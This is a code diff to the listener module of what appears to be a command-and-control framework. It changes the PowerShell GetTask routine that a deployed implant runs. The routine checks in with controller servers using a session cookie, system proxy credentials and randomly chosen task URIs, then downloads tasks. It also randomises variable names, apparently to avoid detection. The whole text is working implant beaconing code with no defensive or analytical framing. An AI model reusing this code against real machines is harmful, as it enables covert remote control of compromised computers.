@@ -795,10 +795,11 @@ class Listener:
 
                 getTask = """
                     $script:GetTask = {
+                        param($FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
                         try {
-                            if ($ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
@@ -810,22 +811,21 @@ class Listener:
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
+                                if($FixedParameters["Proxy"]) {
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
                                 }
 
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$FixedParameters["headers"]["UserAgent"])
                                 $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $taskURI = $FixedParameters["taskURIs"] | Get-Random
+                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
                                 $result
                             }
                         }
                         catch [Net.WebException] {
-                            $script:MissedCheckins += 1
                             if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
